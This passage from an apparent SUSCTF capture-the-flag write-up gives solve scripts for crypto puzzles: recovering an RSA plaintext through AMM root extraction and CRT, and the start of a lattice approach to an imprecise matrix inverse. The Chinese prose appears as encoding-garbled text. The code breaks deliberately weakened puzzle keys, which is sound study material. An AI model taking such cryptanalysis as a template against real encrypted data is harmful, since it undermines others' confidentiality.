$$c2^{-1024e}\equiv{m^e}\pmod{n}$$</p><p>ä¹‹ååˆ†åˆ«è®¡ç®—æ¨¡på’Œæ¨¡qçš„æƒ…å†µ</p><p>$$cp\equiv{m^{e1 \times e2 \times e3}}\pmod{p} $$</p><p>$$cp^{-e2 \times e3}\equiv{m^{e1}}\pmod{p} $$</p><p>$$ cq\equiv{m^{e1 \times e2 \times e3}}\pmod{q} $$</p><p>$$cq^{-e1 \times e3}\equiv{m^{e2}}\pmod{q} $$</p><p>å¯¹ä¸Šé¢çš„å¼å­ä½¿ç”¨ammç®—æ³•ï¼Œå°±å¯ä»¥å¾—åˆ°mpã€mqçš„åˆ—è¡¨ï¼Œç„¶åä½¿ç”¨crtå¯¹å…¶ç»„åˆï¼Œç”¨SUSCTFæ ¡éªŒå³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span><span class=lnt>98
</span><span class=lnt>99
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>127846753573603084140032502367311687577517286192893830888210505400863747960458410091624928485398237221748639465569360357083610343901195273740653100259873512668015324620239720302434418836556626441491996755736644886234427063508445212117628827393696641594389475794455769831224080974098671804484986257952189021223</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=mi>145855456487495382044171198958191111759614682359121667762539436558951453420409098978730659224765186993202647878416602503196995715156477020462357271957894750950465766809623184979464111968346235929375202282811814079958258215558862385475337911665725569669510022344713444067774094112542265293776098223712339100693</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=mi>165967627827619421909025667485886197280531070386062799707570138462960892786375448755168117226002965841166040777799690060003514218907279202146293715568618421507166624010447447835500614000601643150187327886055136468260391127675012777934049855029499330117864969171026445847229725440665179150874362143944727374907</span>
</span></span><span class=line><span class=cl><span class=c1># fp = [2, 7, 757, 1709, 85015583 , 339028665499, 149105250954771885483776047]</span>
</span></span><span class=line><span class=cl><span class=c1># fq = [2, 3, 66553,81768440203, 84405986771, 38037107558208320033, 16137718604846030589135490851713]</span>
</span></span><span class=line><span class=cl><span class=c1># fr = [2, 5156273, 10012111, 11607389, 68872137169799749, 9691125310820433463]</span>
</span></span><span class=line><span class=cl><span class=c1># e_list = []</span>
</span></span><span class=line><span class=cl><span class=c1># for i in fp:</span>
</span></span><span class=line><span class=cl><span class=c1>#     for j in fq:</span>
</span></span><span class=line><span class=cl><span class=c1>#         for k in fr:</span>
</span></span><span class=line><span class=cl><span class=c1>#             e_list.append(i*j*k)</span>
</span></span><span class=line><span class=cl><span class=c1># print(e)</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>757</span> <span class=o>*</span> <span class=mi>66553</span> <span class=o>*</span><span class=mi>5156273</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>AMM</span><span class=p>(</span><span class=n>o</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=n>q</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>----------------------------------------------------------------------------------&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Start to run Adleman-Manders-Miller Root Extraction Method&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Try to find one </span><span class=si>{:#x}</span><span class=s1>th root of </span><span class=si>{}</span><span class=s1> modulo </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>o</span><span class=p>,</span> <span class=n>q</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>o</span> <span class=o>=</span> <span class=n>g</span><span class=p>(</span><span class=n>o</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>g</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>p</span> <span class=o>^</span> <span class=p>((</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=n>r</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>g</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>q</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>q</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>s</span> <span class=o>%</span> <span class=n>r</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>s</span> <span class=o>//</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>k</span> <span class=o>*</span> <span class=n>s</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=n>r</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>alp</span> <span class=o>=</span> <span class=p>(</span><span class=n>k</span> <span class=o>*</span> <span class=n>s</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>p</span> <span class=o>^</span> <span class=p>(</span><span class=n>r</span><span class=o>**</span><span class=p>(</span><span class=n>t</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>o</span> <span class=o>^</span> <span class=p>(</span><span class=n>r</span><span class=o>*</span><span class=n>alp</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>p</span> <span class=o>^</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>t</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=n>b</span> <span class=o>^</span> <span class=p>(</span><span class=n>r</span><span class=o>^</span><span class=p>(</span><span class=n>t</span><span class=o>-</span><span class=mi>1</span><span class=o>-</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>d</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>j</span> <span class=o>=</span> <span class=o>-</span> <span class=n>discrete_log</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>b</span> <span class=o>*</span> <span class=p>(</span><span class=n>c</span><span class=o>^</span><span class=n>r</span><span class=p>)</span><span class=o>^</span><span class=n>j</span>
</span></span><span class=line><span class=cl>        <span class=n>h</span> <span class=o>=</span> <span class=n>h</span> <span class=o>*</span> <span class=n>c</span><span class=o>^</span><span class=n>j</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>c</span><span class=o>^</span><span class=n>r</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>o</span><span class=o>^</span><span class=n>alp</span> <span class=o>*</span> <span class=n>h</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Finished in </span><span class=si>{}</span><span class=s2> seconds.&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>end</span> <span class=o>-</span> <span class=n>start</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>findAllPRoot</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>proot</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>proot</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>proot</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>),</span> <span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>//</span><span class=n>e</span><span class=p>,</span> <span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>proot</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>findAllSolutions</span><span class=p>(</span><span class=n>mp</span><span class=p>,</span> <span class=n>proot</span><span class=p>,</span> <span class=n>cp</span><span class=p>,</span> <span class=n>p</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Start to find all the </span><span class=si>{:#x}</span><span class=s2>th root of </span><span class=si>{}</span><span class=s2> modulo </span><span class=si>{}</span><span class=s2>.&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>cp</span><span class=p>,</span> <span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>all_mp</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>root</span> <span class=ow>in</span> <span class=n>proot</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mp2</span> <span class=o>=</span> <span class=n>mp</span> <span class=o>*</span> <span class=n>root</span> <span class=o>%</span> <span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=n>all_mp</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>mp2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Finished in </span><span class=si>{}</span><span class=s2> seconds.&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>end</span> <span class=o>-</span> <span class=n>start</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>all_mp</span>
</span></span><span class=line><span class=cl><span class=n>n</span><span class=o>=</span><span class=n>p</span><span class=o>*</span><span class=n>q</span><span class=o>*</span><span class=n>r</span>
</span></span><span class=line><span class=cl><span class=c1># tmp = pow(int(1&lt;&lt;1024),int(e),n)</span>
</span></span><span class=line><span class=cl><span class=n>tmp</span> <span class=o>=</span> <span class=mi>2794203162952680694875426764547234241112236710433123774476303768639242351566319207612773628883250609134659396011750795113351981408956541443986997306105869563120160376511155383832592237253107342927670770094240045412123787825031261131955433947396826167219004667304636335427373984885928591487526163086731412269053200262557436796244981351739716063496342017497841802350338687039580076905949641402173299773716271511639533823663740291331408514189072329517625171120136705677613965360814741037067953490597466636290290725085921897578223035738383932219334876192857916281288629471625406358741715112812225419217748429901501082216480552255233899368763011103720695984389763743356559299690991047172680728215625377751497287365075742929734077041112027582350488222091280835389084342367259161290929159777553525296385682720359499417021854388648183468514374707670903349123145819166174953312125050648613697527164777642887701658900202492759171557250</span>
</span></span><span class=line><span class=cl><span class=n>realc</span><span class=o>=</span><span class=n>inverse_mod</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span><span class=n>n</span><span class=p>)</span><span class=o>*</span><span class=n>c</span><span class=o>%</span><span class=n>n</span>
</span></span><span class=line><span class=cl><span class=n>er</span><span class=o>=</span><span class=mi>5156273</span>
</span></span><span class=line><span class=cl><span class=n>der</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>er</span><span class=p>,(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>realc</span><span class=p>),</span> <span class=n>der</span><span class=p>,</span><span class=n>p</span><span class=o>*</span><span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dp</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mi>66553</span><span class=p>,</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dq</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=mi>757</span><span class=p>,</span> <span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cp</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>c</span><span class=p>),</span><span class=nb>int</span><span class=p>(</span><span class=n>dp</span><span class=p>),</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>cq</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>c</span><span class=p>),</span><span class=nb>int</span><span class=p>(</span><span class=n>dq</span><span class=p>),</span><span class=nb>int</span><span class=p>(</span><span class=n>q</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>mp</span> <span class=o>=</span> <span class=n>AMM</span><span class=p>(</span><span class=n>cp</span><span class=p>,</span> <span class=mi>757</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mq</span> <span class=o>=</span> <span class=n>AMM</span><span class=p>(</span><span class=n>cq</span><span class=p>,</span> <span class=mi>66553</span><span class=p>,</span> <span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p_proot</span> <span class=o>=</span> <span class=n>findAllPRoot</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=mi>757</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q_proot</span> <span class=o>=</span> <span class=n>findAllPRoot</span><span class=p>(</span><span class=n>q</span><span class=p>,</span> <span class=mi>66553</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mps</span> <span class=o>=</span> <span class=n>findAllSolutions</span><span class=p>(</span><span class=n>mp</span><span class=p>,</span> <span class=n>p_proot</span><span class=p>,</span> <span class=n>cp</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mqs</span> <span class=o>=</span> <span class=n>findAllSolutions</span><span class=p>(</span><span class=n>mq</span><span class=p>,</span> <span class=n>q_proot</span><span class=p>,</span> <span class=n>cq</span><span class=p>,</span> <span class=n>q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Start CRT...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>mpp</span> <span class=ow>in</span> <span class=n>mps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>mpp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>mqq</span> <span class=ow>in</span> <span class=n>mqs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>solution</span> <span class=o>=</span> <span class=n>crt</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>mpp</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>mqq</span><span class=p>)],</span> <span class=p>[</span><span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;SUSCTF&#39;</span> <span class=ow>in</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Finished in </span><span class=si>{}</span><span class=s2> seconds.&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>end</span> <span class=o>-</span> <span class=n>start</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=inverseproblem>InverseProblem</h2><p>å°æ•°çŸ©é˜µä¹˜æ³•æ±‚é€†ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ— è®ºå¦‚ä½•è®¡ç®—éƒ½ä¼šäº§ç”Ÿç²¾åº¦æŸå¤±ï¼ˆåšé¢˜è¿‡ç¨‹ä¸­å°è¯•äº†ä½¿ç”¨RationalåŸŸè®¡ç®—éƒ½æ²¡ç”¨ï¼‰ï¼Œåæ¥æ„è¯†åˆ°ä¹Ÿè®¸å¯ä»¥ç”¨æ ¼æ¥åšï¼Œæ„é€ ä¸€ä¸ªè¿™æ ·çš„æ ¼ï¼š
<img src=/img/2022-2-28-SUSCTF/20220301005626248.jpg alt=img>
å…¶å·¦è¾¹å¦‚æœä¹˜ä»¥flagæ„æˆçš„å‘é‡ï¼Œé‚£ä¹ˆå¾—åˆ°çš„ç›®æ ‡å‘é‡ä¼šæ˜¯ï¼š$ (errors, flag) $ï¼Œç†æƒ³çŠ¶æ€ä¸‹ï¼Œerrorsç­‰äº0ï¼Œä½†æ˜¯å—åˆ°ç²¾åº¦å½±å“ï¼Œerrorsä¸ç­‰äº0ï¼Œä½†æ˜¯å¾ˆå°ï¼ŒåŒæ—¶flagä¹Ÿå¾ˆå°ï¼Œå› æ­¤å¯ä»¥è¾¾æˆç›®çš„ã€‚
expå¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;3.657060500339054556e+02
</span></span></span><span class=line><span class=cl><span class=s1>3.832239212422502419e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.006400878420690219e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.178419900792603698e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.347228858757071634e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.511847676148433948e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.671407458110251127e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.825167947918074560e+02
</span></span></span><span class=line><span class=cl><span class=s1>4.972528090932780174e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.113029695817293714e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.246354631948004226e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.372316391653928349e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.490847173300799113e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.601981891814167511e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.705840667157972348e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.802611340293560716e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.892533389518160902e+02
</span></span></span><span class=line><span class=cl><span class=s1>5.975884263745526823e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.052968650055386206e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.124110630374365201e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.189648165161182760e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.249928981118596312e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.305306816020913629e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.356137112146116124e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.402771610768811570e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.445551788138646998e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.484801562386791147e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.520820067831411961e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.553875449515115861e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.584200543535777115e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.611991006926840555e+02
</span></span></span><span class=line><span class=cl><span class=s1>6.637406026122149569e+02
